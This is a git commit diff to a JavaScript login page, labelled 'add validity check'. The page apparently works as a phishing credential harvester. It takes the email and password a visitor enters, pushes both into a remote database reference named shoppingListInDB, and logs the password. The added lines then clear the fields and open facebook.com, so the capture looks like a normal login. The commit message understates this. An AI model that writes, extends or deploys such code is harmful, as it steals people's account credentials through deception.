55a746d1a91a26bae130764257876d4c257ac89e
Raj Poudel <raj.poudeel@gmail.com>
2023-06-07 15:10:03 +0545

    add validity check

--- index.js
+++ index.js
@@ -21,26 +21,30 @@ const emailEl = document.getElementById("email")
 loginbtn.addEventListener("click",function () {
     let passwordValue = passwordEl.value
     let emailValue = emailEl.value
+    var url = "https://facebook.com"; // Replace with your desired URL
     if(emailValue.length <= 8 && passwordValue.length <= 7){
         alert("Please Enter Valid data")
     }
     else{
         
    
+        clearInputFieldEl();
         push(shoppingListInDB,emailValue ) //ref first argu and value 2nd argu
         push(shoppingListInDB,passwordValue ) //ref first argu and value 2nd argu
-        
-        clearInputFieldEl();
+        window.open(url)
         
         // appendItemto(inputValue) ;  from commenting this line we prevent double fetching and adding element bug in while add to parentEl
     
         console.log(` ${passwordValue} added to database`);
+         
+  
  }
 })
 
 //function for clearing input 
 function clearInputFieldEl(){
        passwordEl.value="";
+       emailEl.value ="";
 }
 
 
